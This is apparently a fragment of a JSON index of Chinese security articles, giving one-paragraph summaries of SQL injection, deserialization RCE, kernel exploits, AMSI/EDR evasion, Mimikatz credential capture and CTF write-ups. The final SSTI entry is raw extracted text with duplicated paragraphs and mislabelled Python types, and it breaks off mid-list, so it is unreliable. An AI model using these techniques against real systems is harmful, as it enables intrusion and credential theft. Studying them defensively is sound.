        "page_content": "该文档详细介绍了如何利用 zzzphp cms 中 save_content() 方法中的 SQL 注入漏洞，通过在 c_content 参数中插入 SQL 语句来创建数据库。该漏洞存在于 $c_content 参数未经过转义的情况下，允许攻击者执行任意 SQL 命令。",
        "FileName": "9821-zzzphp save.php save_content方法下sql注入.pdf"
    },
    {
        "page_content": "该文档记录了一次对某网站的渗透测试，测试者通过各种技术绕过安全措施，最终获得了对网站的控制权。测试中发现的漏洞包括：SQL注入、反射XSS、文件上传、目录遍历、SSRF和WAF绕过。测试者还对网站的源码进行了审计，发现了逻辑漏洞和敏感信息泄露。",
        "FileName": "12041-记一次对某站点的渗透测试(bypass).pdf"
    },
    {
        "page_content": "该文档描述了一个通过越权跳转漏洞导致的 Flowable 工作流引擎命令执行漏洞。攻击者利用越权跳转访问了学习平台功能模块，并发现了 Flowable 工作流引擎中一个名为“shell”的任务模块。通过修改该任务的命令参数，攻击者能够在系统中执行任意命令，包括写入文件和下载 JSP 文件。该漏洞的利用需要越权跳转漏洞作为前提条件，但如果该漏洞被修复，则该命令执行漏洞也无法利用。",
        "FileName": "11144-越权跳转导致的flowable命令执行.pdf"
    },
    {
        "page_content": "Java 反射机制允许程序在运行时动态访问和操作类的属性、方法、构造方法等信息，从而实现动态装配、降低代码耦合度和动态代理等功能。通过 Class 类，可以获取类的信息，创建对象，执行方法，进行类型检查等操作。反射机制提供了 Field、Method 和 Constructor 类来分别操作类的属性、方法和构造方法。",
        "FileName": "12465-java反射.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-0185 Linux 内核漏洞，该漏洞利用 FUSE 技术导致稳定 race 条件。文档详细介绍了漏洞的原理、利用方法和缓解措施，包括利用 msg_msg 结构进行泄露、利用 FUSE 技术进行任意地址写入和利用 modprobe_path 完成提权。",
        "FileName": "11031-CVE-2022-0185 linux kernel利用FUSE技术稳定race.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何对一个非法网站进行SQL注入攻击，并逐步指导如何绕过安全措施，获取数据库信息，获取表名和列名，上传webshell，打包源码和数据库，最后在本地搭建网站。",
        "FileName": "8213-记一次对某非法站点从SQL注入到整站打包与本地搭建全过程.pdf"
    },
    {
        "page_content": "该文档详细介绍了通过利用 Google Cloud Deployment Manager（部署管理器）的内部版本（狗粮版本）在 Google 的全球服务负载平衡器（GSLB）上执行 RCE 的过程。通过向部署管理器发送一个特定请求，可以创建类型提供器，其中包含一个未记录的字段 googleOptions。该字段允许攻击者通过 GSLB 向 Google 内部站点发出复杂请求，从而实现 RCE。",
        "FileName": "8700-Bugbounty之谷歌云部署管理器RCE漏洞.pdf"
    },
    {
        "page_content": "该文档包含一系列网络安全解密挑战，涉及密码重置、WiFi密码破解、加密密码解密、数据修改、MD5哈希碰撞、逻辑分析仪解码、MD5长度扩展攻击和签名限制的任意文件读取。这些挑战需要使用各种技术和工具来解决，包括爆破、脚本编写、十六进制编辑和哈希扩展。",
        "FileName": "12180-网络安全实验室6.解密关.pdf"
    },
    {
        "page_content": "该文档主要介绍了 SQLite 数据库注⼊的总结，包括 SQLite 的特点、创建数据库、表、插入数据、查询数据、SQLite_master 表、格式化输出、数据库数据、注⼊ Demo、union select 注⼊、盲注、sleep、写 shell 等内容。",
        "FileName": "8627-sqlite注入的一点总结.pdf"
    },
    {
        "page_content": "跨站点 WebSocket 劫持 (CSWSH) 是一种利用 WebSocket 握手中跨站点请求伪造 (CSRF) 漏洞的攻击，当 WebSocket 握手中仅依赖 HTTP cookie 进行会话处理且不包含任何 CSRF 令牌或其他不可预测的值时，就会出现这种情况。攻击者可以在自己的域中创建恶意网页，与易受攻击的应用程序建立跨站点 WebSocket 连接，应用程序将在受害者用户与应用程序的会话上下文中处理连接。然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器收到的消息内容。这意味着，与常规 CSRF 不同，攻击者获得与受感染应用程序的双向交互。",
        "FileName": "11684-关于那WebSocket劫持的二三事.pdf"
    },
    {
        "page_content": "该文档主要讨论了堆溢出漏洞中的两种特殊类型：off by one和off by null。off by one是指程序在向缓冲区写入数据时，写入的字节数超过了缓冲区本身申请的字节数，并且只越界了一个字节。off by null是指程序在向缓冲区写入数据时，由于长度检查不严谨，导致写入了一个空字节，从而造成内存地址的泄露。文档还提供了利用这些漏洞的姿势，包括通过溢出泄露数据、覆盖其他块数据以及构造chunk overlap等。",
        "FileName": "12861-堆溢出 off by one & off by null.pdf"
    },
    {
        "page_content": "禅道项⽬管理系统 (ZenTaoPMS) 是一款功能完备的项⽬管理软件，但存在多个⾼危漏洞，包括 SQL 注⼊、代码注⼊、任意⽂件上传和命令执⾏漏洞。这些漏洞可导致攻击者获取服务器最⾼权限或执⾏任意代码。受影响版本包括 ZenTaoPMS 8.2-9.2.1、<= 11.6 和 10.x < 12.4.3。建议受影响的⽤户升级⾄最新版本或打上补丁。",
        "FileName": "8692-禅道项目管理系统(ZenTaoPMS)高危漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档分析了 hgame 第一周的 re 和 pwn 题解，提供了详细的代码分析和解题思路，包括迷宫类 re 题、位运算 re 题、栈溢出 pwn 题、ROP pwn 题和 Number_Killer pwn 题。",
        "FileName": "7183-Hgame_week_1_re&pwn_wp.pdf"
    },
    {
        "page_content": "文档探讨了 CVE-2020-0796（SMBGhost）漏洞，该漏洞影响 Windows 10 的 1903 和 1909 版本，允许攻击者通过引发死亡蓝屏远程触发本地权限提升。该漏洞利用了 SMB 服务器驱动程序中整数溢出，导致远程任意内存覆盖，从而可以实现本地权限提升，甚至可能远程执行代码。",
        "FileName": "7537-利用SMBGhost (CVE-2020-0796)实现本地权限提升.pdf"
    },
    {
        "page_content": "该文档介绍了如何部署和使用 Wazuh、Praeco、ElastAlert、ElastAlert-Server、Sigma、VulnWhisperer、TheHive 和 Cortex 等工具，以建立一个功能齐全的 SOCaaS（安全运营中心即服务）解决方案，用于威胁检测、事件响应和合规性。",
        "FileName": "9565-SOCasS(把SOC当作一种服务)的架构部署和技术漫谈-下.pdf"
    },
    {
        "page_content": "AdminSDHolder 是一个特殊的 AD 容器，包含受保护的 AD 账户和组，攻击者可以通过修改其 ACL 来获得域权限，而防御者应定期检测和清除可疑的 ACL。",
        "FileName": "7276-域渗透——AdminSDHolder.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2010-2553 漏洞，该漏洞是 Windows Media Player 中的一个堆溢出漏洞。文档详细介绍了漏洞的分析过程，包括基于 POC 的逆向分析、基于源码的分析以及漏洞修复方法。",
        "FileName": "7520-漏洞分析学习之cve-2010-2553.pdf"
    },
    {
        "page_content": "本文介绍了如何绕过双重 WAF（云 WAF 和本地安全狗或代码层防护）来获取数据。作者通过多次 fuzz 测试，发现了一个可以被替换为空的字符（%2527），并利用 SQLmap 的 tamper 功能在每个字符前添加 %2527，从而绕过 WAF 并获取数据。",
        "FileName": "8064-实战绕过双重waf结合sqlmap tamper获取数据.pdf"
    },
    {
        "page_content": "该文档介绍了两种域控权限维持的方法：SSP 和 PasswordChangeNotify。SSP 通过扩展 LSA 并加载恶意 DLL 来获取登录用户的明文密码，而 PasswordChangeNotify 通过钩住 PasswordChangeNotify API 来拦截修改的帐户密码。这些方法可以帮助攻击者在拿下域控后保持对系统的持久访问。",
        "FileName": "10167-域渗透之域控权限维持.pdf"
    },
    {
        "page_content": "Apache Shiro 中的 CVE-2020-13933 漏洞源于 Shiro 和 Spring 对 URL 处理的差异，允许攻击者通过构造特殊 HTTP 请求绕过授权，访问未授权的信息。该漏洞影响 Apache Shiro < 1.6.0 和仅使用 Shiro 鉴权的 Spring 框架。",
        "FileName": "8230-Apache shiro安全漏洞(CVE-2020-13933)分析.pdf"
    },
    {
        "page_content": "Pi-hole 中存在一个远程代码执行漏洞 (CVE-2020-8816)，该漏洞允许经过 Web 门户验证的用户在服务器上执行任意命令，影响版本为 4.3.2 及其之前版本。该漏洞源于软件在处理用户输入的 MAC 地址时未进行验证，导致攻击者可以通过篡改 MAC 地址来执行任意代码。",
        "FileName": "7511-Pi-hole中的远程代码执行漏洞(CVE-2020-8816).pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2023-39476 漏洞，该漏洞影响 Inductive Automation Ignition Java 序列化编解码器，允许未经授权的远程代码执行。文档详细介绍了漏洞的利用过程，包括构造请求包、绕过安全策略以及利用 Java 反序列化漏洞。",
        "FileName": "12813-CVE-2023-39476 Inductive Automation Ignition JavaSerializationCodec Deserialization RCE.pdf"
    },
    {
        "page_content": "本文探讨了 Mimikatz 中 SSP（安全支持提供程序）功能的实现，该功能允许攻击者通过绕过 Microsoft 安全控制来提取凭据。Mimikatz 提供了两种技术来利用 SSP：Mimilib（通过注册表项加载 SSP）和 memssp（通过内存补丁加载 SSP）。本文分析了这两种技术的优缺点，并提出了结合这两种技术以避免检测的方法，包括使用 RPC 调用加载代码而无需直接调用 AddSecurityPackage API。",
        "FileName": "8323-探索Mimikatz-第2部分-SSP.pdf"
    },
    {
        "page_content": "**主题：** 某 CMS 代码审计中利用 XXE 漏洞实现 RCE\n\n**内容：** 该文档详细介绍了如何利用 XXE 漏洞在 libxml2.8 版本的某 CMS 中实现远程代码执行。它通过上传一个包含恶意 XML 实体的 ICO 图像文件，触发 XXE 漏洞，并使用 phar 反序列化技术执行任意代码。文档还提供了 bypass disable_fun 上传 exp 的方法，以绕过禁用函数的限制。",
        "FileName": "10633-某cms代码审计.pdf"
    },
    {
        "page_content": "Goby 是一款网络空间测绘工具，它可以进行资产测绘、Web 视图手动渗透、配合漏扫工具实现自动化、内网横向移动、自定义武器库和团队协作，适用于红蓝对抗和 SRC 挖洞，其优势在于可以实时收集资产信息，并与 Xray 等漏扫工具联动实现自动化挖洞。",
        "FileName": "8572-Goby食用指南.pdf"
    },
    {
        "page_content": "该文档分析了锐捷网关系列通杀 GetShell 漏洞，该漏洞允许攻击者通过 POST 请求执行任意命令。攻击者可以通过在请求中包含命令来反弹 shell，从而获得对目标系统的控制权。该漏洞的利用代码已在 GitHub 上发布，但目前已不可用。",
        "FileName": "9016-锐捷网关系列通杀GetShell代码分析.pdf"
    },
    {
        "page_content": "本文探讨了结构化异常处理 (SEH) 在 Windows 操作系统中的作用，它是一种处理异常事件的程序控制结构。SEH 使用 __try、__except 和 __finally 关键字来定义异常处理程序，并通过 SEH 链表存储在栈中。通过覆盖 SEH 链表中的异常处理函数指针，攻击者可以劫持程序流并控制程序的执行。",
        "FileName": "12201-win pwn初探（四）.pdf"
    },
    {
        "page_content": "该文档提供了 WackoPicko 网站的通关教程，详细介绍了如何利用该网站的各种漏洞，包括 XSS、弱口令、越权访问、目录浏览等，并提供了相应的 payload 和漏洞证明。",
        "FileName": "12095-WackoPicko通关教程.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用 Redis 未授权访问漏洞来连接到目标服务器，并通过修改 Redis 数据库路径和生成 shell 脚本来上传公钥，从而实现 SSH 密钥连接。此外，文档还讨论了在 Ubuntu 和 Debian 系统中解决 Redis crontab 反弹 shell 失败的问题，并提供了使用 Redis-rce 工具进行交互式 shell 和反弹 shell 的方法。",
        "FileName": "12707-Redis未授权利用总结.pdf"
    },
    {
        "page_content": "该文档分析了 Struts2 S2-061 漏洞，该漏洞是 S2-059 补丁的绕过，利用了二次 OGNL 表达式执行。文档详细介绍了漏洞复现过程，包括环境搭建、漏洞利用和绕过限制，并提供了参考文章。",
        "FileName": "8645-踩坑S2-061复现与思考.pdf"
    },
    {
        "page_content": "该文档描述了一种利用权限绕过和 MySQL JDBC 反序列化漏洞来绕过登录验证并获得对目标系统的远程代码执行 (RCE) 访问的方法。攻击者通过修改 MySQL 连接地址并使用恶意 MySQL 服务器，成功利用了 MySQL JDBC 反序列化漏洞，从而获得了对目标系统的控制权。",
        "FileName": "9069-从权限绕过到mysql jdbc反序列化.pdf"
    },
    {
        "page_content": "该文档详细介绍了熊海 CMS 代码审计过程，包括漏洞位置、漏洞利用方法和绕过策略，涉及 SQL 注入、文件包含、XSS、越权访问和万能密码登录等漏洞。",
        "FileName": "7629-熊海cms代码审计(新手入门向）.pdf"
    },
    {
        "page_content": "这篇文档回顾了 2020 年⽹鼎杯决赛中利用远古漏洞 Vulnfaces 的过程。作者通过搜索相关漏洞，发现了 Richfaces 框架中存在 ViewState 反序列化漏洞和 CVE-2015-0279 漏洞。通过分析漏洞场景和利用方法，作者最终利用 CVE-2018-14667 漏洞成功绕过过滤，构造恶意表达式并执行任意代码。",
        "FileName": "10757-从2020网鼎杯决赛Vulnfaces回顾远古漏洞.pdf"
    },
    {
        "page_content": "Soot是一个用于Java字节码分析和转换的框架，它提供了一个中间代码Jimple，用于表示Java字节码。Jimple是一种类型化的三地址码，可以方便地进行分析和转换。Soot还提供了一个流分析框架，用于构建自定义的流分析，以分析Java字节码的控制流和数据流。",
        "FileName": "11643-一文入门 soot.pdf"
    },
    {
        "page_content": "该文档介绍了 SQLi_Labs 靶场中的 SQL 注入挑战，包括如何使用联合注入、报错注入和盲注技术来查询数据库、表和列，以及如何绕过请求次数限制。",
        "FileName": "12061-SQLi_Labs靶场Challenges学习分享.pdf"
    },
    {
        "page_content": "文档分析了 Nuclei 源代码，重点介绍了其主题和内容，包括：\n\n* Nuclei 是一个基于模板的漏洞扫描工具，具有可配置性和易用性。\n* 它使用 YAML 编写模板，并支持多种报告模式，包括 GitHub、GitLab、Jira 和 Markdown。\n* Nuclei 集成了 headless Chromium，用于模拟浏览器访问。\n* 它实现了接口转换，允许使用任意类型，并提供了用于字符串比较和映射的自定义函数。\n* Nuclei 的模板语法支持静态匹配条件和 DSL 语法，允许动态表达式。\n* 它使用 govaluate 库来评估 DSL 表达式，并提供了对 projectfile 的支持，允许保存项目选项。\n* 文档还提供了集成 Nuclei 的代码示例，展示了如何模拟其输出和进度类。",
        "FileName": "9988-projectdiscovery之nuclei源码阅读.pdf"
    },
    {
        "page_content": "本文探讨了在多层网络环境中进行内网穿透的四种常用软件：ew、nps、frp和venom。通过详细的实验步骤和拓扑图，作者展示了如何使用这些软件在三层甚至四层网络中建立代理隧道，实现对内网主机的访问。文章比较了不同软件的优缺点，并提供了针对不同场景的建议，为读者提供了在复杂网络环境中进行内网穿透的实用指南。",
        "FileName": "10279-内网穿透之多层代理.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 mprotect() 函数修改内存区域的权限，以执行任意代码。它分步指导了如何泄露内存地址、修改 bss 段的权限、将 shellcode 写入 bss 段，最后跳转到 bss 段执行 shellcode。",
        "FileName": "7233-一步一步分析return to mprotect的利用.pdf"
    },
    {
        "page_content": "该文档记录了一次逻辑漏洞的挖掘过程，该漏洞存在于忘记密码功能中。通过修改响应包，研究人员发现服务端没有生成验证码，导致验证码值为 null。利用这一信息，研究人员绕过了验证码验证，成功重置了密码。该漏洞与以往的逻辑漏洞不同，需要根据响应包返回的信息猜测后端逻辑，为漏洞挖掘提供了新的思路。",
        "FileName": "8109-记一次逻辑漏洞的挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了 XPath 注入，一种利用 XPath 解析器松散输入和容错特性的攻击技术。它涵盖了 XPath 注入的原理、语法、常规注入、登录绕过和盲注技术，并提供了示例代码和攻击步骤，帮助读者理解和防御 XPath 注入攻击。",
        "FileName": "7791-XPATH注入学习.pdf"
    },
    {
        "page_content": "该文档分析了如何利用 Apache Commons Collections 库中的反序列化漏洞来构造恶意 Java 代码，该代码可以执行任意 JavaScript 代码，从而在目标系统上获得远程代码执行权限。文档详细介绍了漏洞的利用过程，包括构造恶意数据、触发反序列化过程以及执行恶意代码的步骤。",
        "FileName": "10361-记一次单位应急回溯java源代码.pdf"
    },
    {
        "page_content": "Shellcode Mutator 是一款 Python 脚本，可通过在 Shellcode 源代码中插入无操作指令来改变其特征码，从而帮助红队成员绕过 EDR 检测。该脚本通过随机间隔插入指令集，从而改变 Shellcode 的字节顺序和文件哈希，使其更难被检测到，同时保持其功能不变。",
        "FileName": "12006-利用Shellcode突变器绕过内存扫描.pdf"
    },
    {
        "page_content": "本文探讨了 Node.js 中的一些入门特性，包括原型继承、数据类型、弱类型、数组比较、大小写特性、ES6 模板字符串和实战应用。这些特性在 Node.js 开发中非常有用，可以帮助开发者编写更强大、更灵活的应用程序。",
        "FileName": "7752-nodejs一些入门特性&&实战.pdf"
    },
    {
        "page_content": "本文档探讨了服务器端请求伪造 (SSRF) 漏洞，并提供了利用盲 SSRF 漏洞验证影响的各种 exploit chain。这些 exploit chain 涉及多个应用程序和服务，包括 Elasticsearch、Weblogic、Jenkins、Atlassian 产品、OpenTSDB、Docker、Gitlab、Redis、Memcache、Tomcat 和 FastCGI。",
        "FileName": "9034-A Glossary of Blind SSRF Chains.pdf"
    },
    {
        "page_content": "本文档探讨了 JavaScript 原型链污染攻击，解释了原型链、构造函数、实例、原型对象之间的关系，并通过一个示例说明了如何利用 set-value 库中的原型链污染漏洞来获取应用程序的 flag。",
        "FileName": "9150-从题目中学习JS原型污染攻击.pdf"
    },
    {
        "page_content": "该文档介绍了 L3HCTF re double-joy 题目的解题思路。该题目是一个基于栈的虚拟机（VM）题目，需要分析 VM 指令并还原算法。题目中包含两套 VM 指令，分别进行魔改版的 XTEA 和 TEA 加密。通过分析指令特征和运算细节，可以复现加密和解密脚本，最终解密出正确结果。",
        "FileName": "10538-L3HCTF re double-joy 题解.pdf"
    },
    {
        "page_content": "该文档介绍了利用 Apache Shiro 结合 CB（Commons BeanUtils）和 CC（Commons Collections）依赖进行攻击的方法，包括环境搭建、手工编写 EXP、基于 CB 和 CC 的攻击流程、漏洞分析和注意事项。",
        "FileName": "12514-shiro结合CB和CC依赖的利用.pdf"
    },
    {
        "page_content": "该文档介绍了 gRPC 内存马的研究和查杀，包括 gRPC 的工作原理、内存马的注入和执行方式，以及防御和查杀方法。",
        "FileName": "11985-gRPC内存马研究与查杀.pdf"
    },
    {
        "page_content": "Jetty 是一款 Java Web 服务器和 Servlet 容器，广泛用于机器对机器通信。本文总结了 Jetty 的常见渗透技术，包括利用 HTTP 请求中的特殊字符绕过 WAF、上传 JSP 或 XML 文件进行 RCE、利用 Jetty 对 URL 的解析方式绕过代理服务器上的过滤器等。",
        "FileName": "11821-jetty常用渗透总结.pdf"
    },
    {
        "page_content": "Apache Shiro 权限绕过漏洞 (CVE-2020-11989) 影响使用 Shiro 框架和 Spring 框架的 Java Web 应用程序，当应用程序部署在非根目录且 Spring 控制器中没有其他权限校验代码时，攻击者可以通过构造特殊 URL（如 `/;/test/admin/page`）绕过 Shiro 的权限验证，访问受保护的资源。该漏洞已在 Shiro 1.5.3 中修复，通过修改 URL 获取逻辑来解决问题。",
        "FileName": "7964-Apache Shiro权限绕过漏洞分析(CVE-2020-11989).pdf"
    },
    {
        "page_content": "该文档主要分析了Xstream最新反序列化poc执行报错问题，并通过调试和排错，解决了任意java代码执行报错的问题，提供了可用的poc。",
        "FileName": "10619-Xstream最新反序列化poc执行报错问题.pdf"
    },
    {
        "page_content": "该文档分析了 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的两个漏洞（CVE-2021-41773 和 CVE-2021-42013），这些漏洞允许攻击者绕过路径穿越保护并访问未经授权的文件。2.4.51 版本通过加强对 URL 编码的校验和修复 ap_normalize_path 函数中的绕过条件来修复了这些漏洞。",
        "FileName": "10359-CVE-2021-41773和CVE-2021-42013漏洞分析.pdf"
    },
    {
        "page_content": "本文记录了作者在 tryhackme 的 Holo 靶场中的渗透过程，作者使用了自己的思路和工具，包括端口扫描、虚拟主机发现、任意文件读取、提权、密码破解、域控攻击等，最终成功控制了域控并获得了所有靶机的访问权限。",
        "FileName": "12767-记一次有趣的复杂靶场渗透.pdf"
    },
    {
        "page_content": "本文档分析了高级 AMSI 触发器，并展示了如何通过手动修改绕过这些触发器，从而在不修改 amsi.dll 的情况下绕过 AMSI。该方法涉及识别触发器、替换触发字符串以及解密编码的 Mimikatz 二进制文件。通过这些修改，可以创建未被 AMSI 标记的 Invoke-CustomKatz 版本，从而成功运行 Mimikatz 并绕过内存扫描检测。",
        "FileName": "8287-手工绕过 AMSI - 第二部分Invoke-Mimikatz.pdf"
    },
    {
        "page_content": "这篇文档主要介绍了 SRC 混子挖掘漏洞的方法，包括前期信息收集、漏洞探测、漏洞利用和漏洞提交等方面。文档强调了信息收集的重要性，并提供了多种信息收集工具和技巧。在漏洞探测方面，文档介绍了端⼝扫描、子域名收集、敏感信息泄露检测等方法。在漏洞利用方面，文档介绍了绕过验证码、爆破弱口令、越权访问、CSRF 攻击、文件上传漏洞和 XSS 漏洞等常见漏洞利用技巧。最后，文档还分享了挖掘高危和严重级别漏洞的一些思考，强调了自动化信息收集、漏洞组合拳和细心耐心的重要性。",
        "FileName": "8501-SRC混子的漏洞挖掘之道.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Java 代码审计生命周期中常见的漏洞，包括 SQL 注入、XSS、XXE、SSRF、任意文件操作、命令执行、反序列化、中间件漏洞、业务逻辑漏洞、LDAP 注入、JNDI 注入、SpEL 注入、URL 重定向、文件上传、Groovy 脚本执行等。文档还提供了审计方法、修复建议、漏洞检测脚本编写、后渗透利用等方面的指导。",
        "FileName": "11966-红队java代码审计生命周期.pdf"
    },
    {
        "page_content": "该文档分析了 Tenda 路由器中四个缓冲区溢出漏洞（CVE-2020-13394、CVE-2020-13392、CVE-2020-13391 和 CVE-2020-13390），这些漏洞允许攻击者通过构造恶意请求来执行任意代码。文档提供了漏洞的详细技术分析、利用过程和利用代码，并强调了这些漏洞的严重性。",
        "FileName": "9270-Tenda路由器CVE：四个缓冲区溢出漏洞分析复现.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA 中一个任意文件上传和文件包含导致的远程代码执行漏洞。攻击者可以通过包含日志文件或绕过身份验证上传文件并包含文件来利用此漏洞。该漏洞的利用涉及上传文件，其文件名和部分路径由 ATTACH_ID_NEW 变量生成，该变量由 ATTACH_ID、YM 和 AID 组成。ATTACH_ID_NEW 的完整路径由 ATTACH_PATH2 常量定义，该常量指向 /attach/ 目录。",
        "FileName": "7423-通达OA任意文件上传并利用文件包含导致远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "**文档主题：** SSTI 注⼊的⼆三事\n\n**文档内容：**\n\nSSTI（Server-Side Template Injection），即服务器端模板注⼊，是由于接受⽤户输⼊⽽造成的安全问题，和 sql 注⼊有相似性。它的实质在于服务器端接受了⽤户的输⼊，没有经过过滤或者过滤不严谨，将⽤户输⼊作为 web 应⽤模板的⼀部分，但是在进⾏编译渲染的过程中，执⾏了⽤户输⼊的恶意代码，造成信息泄露，代码和数据混淆， getshell 等问题。\n\n这个问题主要是出在 web 应⽤模板渲染的过程中，⽽ python 中的⼀个微型框架 flask 主要就是使⽤的 jinja2 来作为渲染模板，因此主要学习关于 python flask 的 jinja2 引发的 SSTI 。\n\n服务器模板注⼊，那么什么是模板呢？换句话说，模板就是⼀段话中存在可动态替换的部分。print(\"hello{username}\") 其中的 username 是可以⼈为输⼊或者产⽣影响的，可以动态替换。由于这句代码能够因为不同的 username ⽽显示不同的结果 , 因此我们可以简单的把这段话理解为⼀个模板。\n\n⽽模板引擎的作⽤是为了使⽤户界⾯与业务数据或内容⽣成特定的⽂档。换句话说这⼀过程可以简述为：拿到数据 , 塞到模板⾥ , 然后让渲染引擎将塞进去的东⻄⽣成  html  的⽂本 , 最后返回给浏览器 . 但是渲染的数据是业务数据 , 且⼤多数都由⽤户提供 , 这就意味着⽤户对输⼊可控 . 如果后端没有对⽤户的输⼊进⾏检测和判断 , 那么就容易产⽣代码和数据混淆 , 从⽽产⽣注⼊漏洞可以被⼈注⼊。\n\n之前做题的时候对其他⼤佬的 payload 总是看的⼀知半解，不知道为什么这样组合，为什么这样调⽤，现在从头再学，重新了解⼀ 下魔术⽅法的作⽤和组合。\n\nssti 是源于 python 的，且通过 import 引⼊了许多的类与⽅法。python 的 str( 字符串 ) 、 dict( 字典 ) 、 tuple( 元组 ) 、 list( 列表 ) 这些在 Python 类结构的基类都是 object ，⽽ object 拥有众多的⼦类。那字符串，字典，元组，列表有啥区别呢\n\n前⾔\n\nSSTI 是什么\n\n模板及模板引擎\n\nFlask-jinja2 SSTI\n\n⼀般利⽤姿势\n\n常⽤的魔术⽅法字符串： str 是不可变的，双引号或者单引号中的数据，就是字符串。str 可进⾏的操作：下表索引、切⽚。\n\n元组： python 的元组与列表类似，可以进⾏下标索引、切⽚，不同之处在于元组的元素不能修改，它是不可变的有序集合。元组使 ⽤⼩括号，列表使⽤⽅括号，正是因为 tuple 不可变，所以代码更安全，如果可能，能⽤ tuple 代替 list 就尽量⽤ tuple 。\n\n序列类型： [data1,data2....] tuple 的注意点： tuple=(1,), 只有 1 个元素的 tuple 定义时必须加⼀个逗号\n\n字典： ⽤ { } 表示，是⽆序的，可变的，在其他语⾔中也称为 map ，使⽤键 - 值（ key-value ）存储，具有极快的查找速度，键不可 变，是⼀个可 hash 对象，键值可变\n\n映射类型：通过键与键值映射实现数据存储和查找\n\n列表： list 存储⼀系列有序集合，⽤ [ ] 括起来，列表中的元素是可变的，即可以对列表进⾏修改\n\n序列类型：数据有位置顺序\n\n表示⽅式：\n\n{key1:value1,key2:value2......}\n\n列表： list 存储⼀系列有序集合，⽤ [ ] 括起来，列表中的元素是可变的，即可以对列表进⾏修改\n\n序列类型：数据有位置顺序\n\n表示⽅式：\n\n[data1,data2.....]\n\n当掌握了这些类继承的⽅法，我们可以从任何⼀个变量回溯到最开始的基类\n\n当掌握了这些类继承的⽅法，我们可以从任何⼀个变量回溯到最开始的基类\n\n<clas'object'>\n\n<type\n\n'str'>\n\n\t\t\t\t\t\t\t\t\t\t\t// 字符串\n\n<type\n\n'tuple'>\t\t\t\t\t\t\t\t\t// 元组\n\n<type\n\n'list'>\t\t\t\t\t\t\t\t\t\t// 列表\n\n<type\n\n'dict'>\t\t\t\t\t\t\t\t\t\t// 字典\n\n<type\n\n'mappingproxy'>\t\t\t\t\t\t\t\t\t// 映射类型：通过键与键值映射实现数据存储和查找\n\n<type\n\n'set'>\t\t\t\t\t\t\t\t\t\t// 集合：⽤ { } 表示，是⽆序的，可变的，在其他语⾔中也称为 map ，使⽤键 - 值（ key-value ）存储，具有极快的查找速度，键不可 变，是⼀个可 hash 对象，键值可变\n\n<type\n\n'str'>\n\n<type\n\n'slice'>\t\t\t\t\t\t\t\t\t// 切⽚\n\n<type\n\n'staticmethod'>\t\t\t\t\t\t\t\t// 静态类型\n\n<type\n\n'complex'>\t\t\t\t\t\t\t\t\t// 复杂\n\n<type\n\n'float'>\t\t\t\t\t\t\t\t\t\t// 浮点\n\n<type\n\n'frozenset'>\t\t\t\t\t\t\t\t\t// 集合：⽤ { } 表示，是⽆序的，可变的，在其他语⾔中也称为 map ，使⽤键 - 值（ key-value ）存储，具有极快的查找速度，键不可 变，是⼀个可 hash 对象，键值可变\n\n<type\n\n'property'>\t\t\t\t\t\t\t\t\t// 属性\n\n<type\n\n'managedbuffer'>\t\t\t\t\t\t\t\t// 内存视图\n\n<type\n\n'memoryview'>\t\t\t\t\t\t\t\t\t// 内存视图\n\n<type\n\n'tuple'>\t\t\t\t\t\t\t\t\t// 元组\n\n<type\n\n'enumerate'>\t\t\t\t\t\t\t\t\t// 枚举\n\n<type\n\n'reversed'>\t\t\t\t\t\t\t\t\t// 反转\n\n<type\n\n'stderrprinter'>\t\t\t\t\t\t\t\t// 标准错误打印机\n\n<type\n\n'code'>\t\t\t\t\t\t\t\t\t\t// 代码\n\n<type\n\n'frame'>\t\t\t\t\t\t\t\t\t\t// 框架\n\n<type\n\n'builtin_function_or_method'>\t\t\t\t\t// 内置函数或⽅法\n\n<type\n\n'method'>\t\t\t\t\t\t\t\t\t\t// ⽅法\n\n<type\n\n'function'>\t\t\t\t\t\t\t\t\t\t// 函数\n\n<type\n\n'mappingproxy'>\t\t\t\t\t\t\t\t\t// 映射类型：通过键与键值映射实现数据存储和查找\n\n<type\n\n'generator'>\t\t\t\t\t\t\t\t\t// 生成器\n\n<type\n\n'getset_descriptor'>\t\t\t\t\t\t\t// 获取设置描述符\n\n<type\n\n'wrapper_descriptor'>\t\t\t\t\t\t\t// 包装描述符\n\n<type\n\n'method-wrapper'>\t\t\t\t\t\t\t\t// ⽅法包装器\n\n<type\n\n'ellipsis'>\t\t\t\t\t\t\t\t\t// 省略号\n\n<type\n\n'member_descriptor'>\t\t\t\t\t\t\t// 成员描述符\n\n<type\n\n'types.SimpleNamespace'>\t\t\t\t\t\t// 简单命名空间\n\n<type\n\n'PyCapsule'>\t\t\t\t\t\t\t\t\t// 胶囊\n\n<type\n\n'longrange_iterator'>\t\t\t\t\t\t\t// 长范围迭代器\n\n<type\n\n'cell'>\t\t\t\t\t\t\t\t\t\t// 单元\n\n<type\n\n'instancemethod'>\t\t\t\t\t\t\t\t// 实例⽅法\n\n<type\n\n'classmethod_descriptor'>\t\t\t\t\t\t// 类⽅法描述符\n\n<type\n\n'method_descriptor'>\t\t\t\t\t\t\t// ⽅法描述符\n\n<type\n\n'callable_iterator'>\t\t\t\t\t\t\t// 可调⽤迭代器\n\n<type\n\n'iterator'>\t\t\t\t\t\t\t\t\t\t// 迭代器\n\n<type\n\n'pickle.PickleBuffer'>\t\t\t\t\t\t\t// 序列化缓冲区\n\n<type\n\n'coroutine'>\t\t\t\t\t\t\t\t\t// 协程\n\n<type\n\n'coroutine_wrapper'>\t\t\t\t\t\t\t// 协程包装器\n\n<type\n\n'InterpreterID'>\t\t\t\t\t\t\t\t// 解释器 ID\n\n<type\n\n'EncodingMap'>\t\t\t\t\t\t\t\t\t// 编码映射\n\n<type\n\n'fieldnameiterator'>\t\t\t\t\t\t\t// 字段名迭代器\n\n<type\n\n'formatteriterator'>\t\t\t\t\t\t\t// 